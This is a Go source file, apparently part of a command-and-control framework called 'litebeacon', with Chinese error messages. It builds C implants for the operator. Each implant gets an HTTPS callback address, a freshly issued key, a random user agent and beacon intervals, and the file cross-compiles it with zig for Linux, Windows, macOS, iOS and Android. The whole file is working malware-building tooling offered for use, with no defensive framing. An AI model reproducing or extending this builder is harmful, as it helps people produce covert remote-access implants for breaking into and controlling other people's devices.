package litebeacon

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// BuildRequest is the operator's choices before a C implant is compiled.
type BuildRequest struct {
	Name    string
	OS      string
	Arch    string
	URL     string // https://host:port, without the check-in path
	Path    string
	IdleSec int
	FastSec int
}

// Build compiles a C implant with the chosen callback and a fresh key.
// The key is stored on the server; the binary is returned to the operator.
func Build(req BuildRequest) (filename string, data []byte, err error) {
	goos := strings.ToLower(strings.TrimSpace(req.OS))
	goarch := strings.ToLower(strings.TrimSpace(req.Arch))
	if err := supportedTarget(goos, goarch); err != nil {
		return "", nil, err
	}
	path, err := RegisterPath(req.Path)
	if err != nil {
		return "", nil, err
	}
	base := strings.TrimRight(strings.TrimSpace(req.URL), "/")
	if !strings.HasPrefix(base, "https://") || strings.Contains(base, " ") {
		return "", nil, fmt.Errorf("回连地址要用 https://主机:端口")
	}
	fullURL := base + path
	idle, fast := req.IdleSec, req.FastSec
	if idle <= 0 {
		idle = 10
	}
	if fast <= 0 {
		fast = 10
	}

	_, secrets, err := consoleStore()
	if err != nil {
		return "", nil, err
	}
	label := req.Name
	if label == "" {
		label = "c"
	}
	entry, err := secrets.Issue(label)
	if err != nil {
		return "", nil, err
	}
	if mgrStore != nil {
		mgrStore.SetIntervalPolicy(uint32(idle), uint32(fast))
	}
	cfgH, err := GenerateConfigH(ConfigParams{
		URL:             fullURL,
		SecretB64:       entry.SecretB64,
		KeyName:         entry.KeyName,
		UserAgent:       RandomUserAgent(),
		BaseIntervalSec: uint32(idle),
	})
	if err != nil {
		return "", nil, err
	}
	data, err = compileImplant(cfgH, goos, goarch)
	if err != nil {
		return "", nil, err
	}
	name := label
	if name == "" {
		name = "c"
	}
	ext := ""
	if goos == "windows" {
		ext = ".exe"
	}
	return fmt.Sprintf("%s-%s-%s%s", sanitizeFile(name), goos, goarch, ext), data, nil
}

func supportedTarget(goos, goarch string) error {
	switch goos + "/" + goarch {
	case "linux/amd64", "linux/arm64", "windows/amd64", "darwin/amd64", "darwin/arm64", "ios/arm64", "android/arm64":
		return nil
	default:
		return fmt.Errorf("不支持的目标 %s/%s", goos, goarch)
	}
}

func zigBin() (string, error) {
	return EnsureZig()
}

func sanitizeFile(name string) string {
	var b strings.Builder
	for _, r := range name {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' {
			b.WriteRune(r)
		}
	}
	if b.Len() == 0 {
		return "c"
	}
	return b.String()
}

func compileImplant(configH, goos, goarch string) ([]byte, error) {
	src, err := findSources()
	if err != nil {
		return nil, err
	}
	dir, err := os.MkdirTemp("", "lite-build-")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(dir)
	for _, name := range []string{"main.c", "linux.c", "win.c", "darwin.c", "port.h"} {
		in, err := os.ReadFile(filepath.Join(src, name))
		if err != nil {
			return nil, err
		}
		if err := os.WriteFile(filepath.Join(dir, name), in, 0o644); err != nil {
			return nil, err
		}
	}
	if err := os.WriteFile(filepath.Join(dir, "config.h"), []byte(configH), 0o600); err != nil {
		return nil, err
	}
	zig, err := zigBin()
	if err != nil {
		return nil, err
	}
	spec, err := zigSpec(goos, goarch)
	if err != nil {
		return nil, err
	}
	outPath := filepath.Join(dir, spec.out)
	args := []string{"cc", "-target", spec.triple, "-O2"}
	if spec.openssl {
		include, lib, err := ensureLinuxOpenSSL(goarch)
		if err != nil {
			return nil, err
		}
		// Headers and shared libraries come from a cached Debian sysroot.
		// Zig's own search path is empty when the target is not the host.
		args = append(args, "-I"+include, "-L"+lib)
	}
	args = append(args, "-o", outPath, "main.c", spec.src)
	args = append(args, spec.extra...)
	if sdk := appleSDK(goos); sdk != "" {
		args = append(args, "-F", filepath.Join(sdk, "System", "Library", "Frameworks"), "-L", filepath.Join(sdk, "usr", "lib"))
	}
	cmd := exec.Command(zig, args...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		text := string(out)
		if len(text) > 1200 {
			text = text[len(text)-1200:]
		}
		return nil, fmt.Errorf("编译失败: %v\n%s", err, text)
	}
	return os.ReadFile(outPath)
}

type zigTargetSpec struct {
	triple  string
	src     string
	out     string
	extra   []string
	openssl bool
}

func zigSpec(goos, goarch string) (zigTargetSpec, error) {
	switch goos + "/" + goarch {
	case "linux/amd64":
		return zigTargetSpec{"x86_64-linux-gnu." + linuxGlibcABI, "linux.c", "lite", []string{"-lssl", "-lcrypto"}, true}, nil
	case "linux/arm64":
		return zigTargetSpec{"aarch64-linux-gnu." + linuxGlibcABI, "linux.c", "lite", []string{"-lssl", "-lcrypto"}, true}, nil
	case "windows/amd64":
		return zigTargetSpec{"x86_64-windows-gnu", "win.c", "lite.exe", []string{"-lwinhttp", "-lbcrypt", "-ladvapi32"}, false}, nil
	case "darwin/amd64":
		return zigTargetSpec{"x86_64-macos", "darwin.c", "lite", appleFrameworks(), false}, nil
	case "darwin/arm64":
		return zigTargetSpec{"aarch64-macos", "darwin.c", "lite", appleFrameworks(), false}, nil
	case "ios/arm64":
		return zigTargetSpec{"aarch64-ios", "darwin.c", "lite", appleFrameworks(), false}, nil
	case "android/arm64":
		return zigTargetSpec{"aarch64-linux-android", "linux.c", "lite", []string{"-lssl", "-lcrypto"}, false}, nil
	default:
		return zigTargetSpec{}, supportedTarget(goos, goarch)
	}
}

func appleFrameworks() []string {
	return []string{
		"-framework", "Security",
		"-framework", "CoreFoundation",
		"-Wno-deprecated-declarations",
	}
}

func appleSDK(goos string) string {
	if goos != "darwin" && goos != "ios" {
		return ""
	}
	if sdk := os.Getenv("SDKROOT"); sdk != "" {
		return sdk
	}
	out, err := exec.Command("xcrun", "--sdk", map[string]string{"ios": "iphoneos", "darwin": "macosx"}[goos], "--show-sdk-path").Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func findSources() (string, error) {
	var candidates []string
	if cwd, err := os.Getwd(); err == nil {
		candidates = append(candidates, cwd)
	}
	if exe, err := os.Executable(); err == nil {
		candidates = append(candidates, filepath.Dir(exe))
	}
	for _, start := range candidates {
		dir := start
		for i := 0; i < 6; i++ {
			src := filepath.Join(dir, "implant", "lite", "main.c")
			if _, err := os.Stat(src); err == nil {
				return filepath.Dir(src), nil
			}
			parent := filepath.Dir(dir)
			if parent == dir {
				break
			}
			dir = parent
		}
	}
	return "", fmt.Errorf("找不到 implant/lite 源码，无法现场编译")
}
